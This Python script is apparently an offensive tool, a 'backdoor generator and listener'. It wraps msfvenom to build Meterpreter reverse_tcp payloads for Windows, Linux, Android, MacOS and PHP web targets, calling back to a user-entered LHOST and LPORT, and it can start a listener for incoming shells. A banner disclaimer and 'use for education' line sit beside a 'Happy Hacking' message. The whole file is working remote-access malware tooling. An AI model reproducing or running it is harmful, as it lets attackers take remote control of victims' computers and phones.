#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('core/')
from listener import *

print("""

 ________________________________________________________________________ 
|                                               .--.              .--.   |
| LEGAL WARNING: While you are using this tool : (\ ". _......_ ." /) :  |
| there are significant risks. You can harm     '.    `         `   .'   | 
| systems and people with this tool but          /'   _        _   `\    |
| the coder won't be held responsible for       /     0}      {0     \   | 
| any damage you cause!!! if you get in        |       /      \       |  |
| trouble remember you are on your own!        |     /'        `\     |  |
| [!] READ terms.txt BEFORE STARTING!           \   | .  .==.  . |   /   |
|      USE FOR EDUCATION :)                      '._ \.' \__/ './ _.'    |
|        AUTHOR-MENDAX                           /  ``'._-''-_.'``  \    |
|________________________________________________________________________|
[***]                                                                [***]
[***]           APT30 Backdoor Generator and Listener                [***]
[***]                     MENDAX  YAZILIM                            [***]
[***]                     Coded By Mendax                            [***]
[***]            Our Instagram => @mendaxyazilim/                    [***]
[***]          Website => https://mendaxyazilim.com    	             [***]
[***]________________________________________________________________[***]
1) BackDoors 
2) Listener

""")

choice = raw_input("Enter your choice APT30#:  ")

if(choice=="1"):
	print("""
                             888   .d8888b.  .d8888b.  
                             888  d88P  Y88bd88P  Y88b 
                             888       .d88P888    888 
              8888ba 88888ba 888888  88888  888    888 
                 188b888 "88b888       "Y8b.888    888 
BACKDOOR/----.d888888888  888888  888    888888    888 
             888  888888 d88PY88b.Y88b  d88PY88b  d88P 
             .Y88888888888PP  "Y888"Y8888P"  "Y8888P"  
                     888  
                     888   APT30==>Backdoor                   
	             888               
___________________________________________________________________________
		           ~ 5 Backdoor Types ~ 
1. Backdoor for Windows
2. Backdoor for Linux
3. Backdoor for Android
4. Backdoor for MacOS
5. Backdoor for Web


       """)
	bd = raw_input("Choose a Backdoor? APT30#: ")

	if(bd=="1"):
		os.system("clear")
		os.system("figlet WINDOWS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe > /root/Desktop/backdoor.exe")
		print("(*) Backdoor generated. Happy Hacking :D")

	if(bd=="2"):
		os.system("clear")
		os.system("figlet LINUX BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.py")
		print("(*) Backdoor generated!")


	if(bd=="3"):
		os.system("clear")
		os.system("figlet ANDROID BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.apk")
		print("(*) Backdoor generated!")


	if(bd=="4"):
		os.system("clear")
		os.system("figlet MacOS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /root/Desktop/backdoor.jar")
		print("(*) Backdoor generated!")


	if(bd=="5"):
		os.system("clear")
		os.system("figlet WEB BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /root/Desktop/backdoor.php")
		print("(*) Backdoor generated!")

if(choice=="2"):
	listener()


	 


	

		
	 
 
                         
                                          
